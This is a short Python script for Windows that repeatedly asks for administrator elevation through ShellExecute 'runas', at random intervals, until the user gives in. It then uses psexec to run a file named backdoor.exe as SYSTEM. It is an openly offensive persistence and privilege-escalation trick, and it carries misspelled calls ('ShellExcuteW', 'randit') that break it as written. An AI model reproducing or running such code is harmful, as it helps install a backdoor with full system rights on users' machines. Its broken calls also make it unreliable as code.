import ctypes, time, random
while True:
	retorno = ctypes.windll.shell32.ShellExcuteW(None, u"runas", u"psexec.exe", \
u"-accepteula -nobanner -s -d C:\\Users\\usuario\\Desktop\\backdoor.exe", None, 0)
	if retorno == 42:
		break
	time.sleep(random.randit(1,11))
